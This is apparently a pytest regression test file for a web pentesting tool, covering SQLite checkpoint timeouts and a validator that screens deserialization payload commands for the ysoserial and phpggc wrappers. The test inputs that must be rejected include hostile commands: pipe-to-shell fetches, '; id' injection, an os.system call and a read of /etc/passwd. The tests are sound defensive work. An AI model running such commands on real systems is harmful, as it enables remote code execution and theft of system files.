"""Regression tests for the audit-remediation P0 controls."""

from __future__ import annotations

import sqlite3
from unittest.mock import patch

import pytest

from webpent.graph.checkpoints import get_checkpointer
from webpent.shared.deserialization import (
    UnsafeDeserializationCommandError,
    build_oob_command_templates,
    validate_deserialization_command,
)


def test_checkpoint_enforces_busy_timeout(tmp_path):
    """Every official SqliteSaver connection must enforce the timeout."""
    db_path = tmp_path / "sessions.db"

    with get_checkpointer(str(db_path)) as checkpointer:
        result = checkpointer.conn.execute("PRAGMA busy_timeout").fetchone()
        assert result == (30_000,)


def test_oob_command_templates_are_bounded_and_shell_safe():
    templates = build_oob_command_templates(
        "https://callback.example.test/api/oob/finding/token?x=a%26b"
    )

    assert len(templates) == 2
    assert all("curl" in command or "wget" in command for command in templates)
    assert all(";" not in command and "|" not in command for command in templates)
    assert all(validate_deserialization_command(command) == command for command in templates)


@pytest.mark.parametrize(
    "command",
    [
        "id",
        "curl http://callback.example.test; id",
        "curl http://callback.example.test | sh",
        "python -c 'import os; os.system(\"id\")'",
        "curl file:///etc/passwd",
        "curl https://user:pass@callback.example.test/oob",
    ],
)
def test_arbitrary_or_unsafe_deserialization_commands_are_rejected(command):
    with pytest.raises(UnsafeDeserializationCommandError):
        validate_deserialization_command(command)


def test_wrapper_rejects_command_before_tool_resolution():
    from webpent.tools.exploitation import phpggc, ysoserial

    with patch.object(ysoserial, "_resolve_java") as resolve_java:
        with pytest.raises(UnsafeDeserializationCommandError):
            ysoserial.generate_ysoserial_payload("id")
        resolve_java.assert_not_called()

    with patch.object(phpggc, "_resolve_phpggc") as resolve_phpggc:
        with pytest.raises(UnsafeDeserializationCommandError):
            phpggc.generate_phpggc_payload("id")
        resolve_phpggc.assert_not_called()


def test_fallback_checkpoint_policy_fails_closed_on_pragma_error(monkeypatch):
    from webpent.graph import checkpoints

    class BrokenConnection:
        def execute(self, _statement):
            raise sqlite3.OperationalError("pragma blocked")

        def close(self):
            return None

    broken = BrokenConnection()
    with (
        pytest.raises(RuntimeError, match="busy_timeout"),
        checkpoints._managed_fallback_saver(broken),
    ):
        pass
